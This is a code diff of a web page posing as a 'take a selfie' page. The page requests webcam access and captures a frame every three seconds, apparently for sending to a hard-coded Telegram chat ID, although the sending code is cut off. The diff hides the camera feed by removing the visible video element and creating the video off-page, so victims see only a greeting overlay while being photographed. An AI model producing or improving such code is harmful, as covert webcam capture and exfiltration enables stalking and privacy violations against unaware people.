@@ -10,7 +10,7 @@
             width: 100%;
             max-width: 600px;
         }
-        video, canvas {
+        canvas {
             width: 100%;
             display: block;
         }
@@ -34,12 +34,10 @@
 <body>
     <h1>Ambil Foto Selfie</h1>
     <div id="video-container">
-        <video id="video" autoplay></video>
         <div id="overlay">HAI BANGG</div>
     </div>
     <canvas id="canvas" style="display: none;"></canvas>
     <script>
-        const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
         const chatId = '7056220365';
@@ -48,16 +46,17 @@
         // Minta akses ke kamera
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
+                const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
                 // Ambil foto setiap 3 detik
-                setInterval(takePhotoAndSend, 3000);
+                setInterval(() => takePhotoAndSend(video), 3000);
             })
             .catch(err => {
                 console.error('Error accessing webcam: ', err);
             });
 
-        function takePhotoAndSend() {
+        function takePhotoAndSend(video) {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
